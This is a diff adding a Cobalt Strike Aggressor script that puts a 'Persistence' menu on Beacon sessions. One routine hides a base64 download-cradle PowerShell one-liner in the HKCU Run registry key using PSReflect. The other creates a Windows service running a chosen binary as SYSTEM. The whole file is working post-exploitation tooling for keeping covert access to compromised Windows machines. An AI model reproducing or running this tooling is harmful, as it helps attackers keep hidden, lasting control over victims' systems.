@@ -1,0 +1,75 @@
+sub hkcu_psh {
+
+	$bid = $1;
+
+	$dialog = dialog("HKCU (PSH) Persistence", $null, lambda({
+
+		$cradle = $3["cradle"];
+
+		btask($bid, "Tasked Beacon to persist via HKCU (PSH)");
+
+		$script = getFileProper(script_resource("persistence\\modules"), "PSReflect.ps1");
+		bpowershell_import!($bid, $script);
+
+		bpowerpick!($bid, "Invoke-RegHide -Verbose -Cradle \" $+ $cradle $+ \"");
+
+	}));
+
+	dialog_description($dialog, "Create a PowerShell oneliner at HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, hidden using PSReflect.");
+	
+	drow_text($dialog, "cradle", "Download Cradle (b64'd): ");
+	dbutton_action($dialog, "Let's Rumble");
+	dialog_show($dialog);
+
+}
+
+sub service {
+	
+	$bid = $1;
+
+	$dialog = dialog("Service Persistence", $null, lambda({
+
+		$name = $3["name"];
+		$displayname = $3["displayname"];
+		$description = $3["description"];
+		$binpath = $3["binpath"];
+		$startup = $3["startup"];
+		$sid = $3["sid"];
+
+		btask($bid, "Tasked Beacon to persist via Windows Service");
+
+		$script = getFileProper(script_resource("persistence\\modules"), "Invoke-ServicePersistence.ps1");
+		bpowershell_import!($bid, $script);
+
+		bpowerpick!($bid, "Invoke-ServicePersistence -Verbose -Name \" $+ $name $+ \" -DisplayName \" $+ $displayname $+ \" -Description \" $+ $description $+ \" -BinPath \" $+ $binpath $+ \" -StartupType \" $+ $startup $+ \" -SID \" $+ $sid $+ \"");
+
+	}));
+
+	dialog_description($dialog, "Create a Windows Service via the Service Control Manager; specify a user SID to assign start/stop privs.");
+
+	drow_text($dialog, "name", "Service Name: ", "test");
+	drow_text($dialog, "displayname", "Display Name (opt): ");
+	drow_text_big($dialog, "description", "Service Description (opt): ");
+	drow_text($dialog, "binpath", "Binary Path: ");
+	drow_combobox($dialog, "startup", "Startup Type", @("Manual", "Automatic"));
+	drow_text($dialog, "sid", "User SID: ");
+	
+	dbutton_action($dialog, "Let's Rumble");
+	dialog_show($dialog);
+
+}
+
+popup beacon_bottom {
+	menu "Persistence" {
+		menu "Userland" {
+			item "HKCU (PSH)" {
+				hkcu_psh($1);
+			}
+		}
+		menu "Elevated" {
+			item "Service (SYSTEM)" {
+				service($1);
+			}
+		}
+	}
+}
